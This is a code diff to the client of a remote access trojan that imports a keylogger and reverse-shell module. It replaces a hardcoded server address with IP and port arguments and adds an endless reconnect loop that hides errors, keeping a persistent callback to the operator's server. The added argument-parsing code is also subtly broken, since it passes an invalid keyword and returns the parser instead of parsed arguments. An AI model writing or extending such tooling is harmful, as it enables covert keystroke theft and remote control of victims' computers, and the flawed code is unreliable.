@@ -1,9 +1,33 @@
 import os
 import socket
+import sys
 
 from connection import Connection
 from keylogger import KeyLogger
 from rev_shell import Shell
+from argparse import ArgumentParser
+
+
+def get_input():
+    parser = ArgumentParser()
+
+    parser.add_argument(
+        "--ip",
+        type=str,
+        required=True,
+        description="IP of the server"
+    )
+
+    parser.add_argument(
+        "--port", "-p",
+        type=int,
+        default=9001,
+        required=False,
+        description="Port of the server"
+    )
+
+    parser.parse_args()
+    return parser
 
 
 def receive_data(sock: socket) -> str:
@@ -169,7 +193,17 @@ class Client:
         file_sock.close()
 
 
+def main():
+    args = get_input()
+    client = Client(host=args.ip, port=args.port)
+    while 1:
+        try:
+            client.run()
+        except Exception as e:
+            print(f"Error: {e}")
+
+
+
 if __name__ == "__main__":
     # Run RAT with specified IP and port continuously
-    while 1:
-        Client("172.20.10.2").run()
+    main()
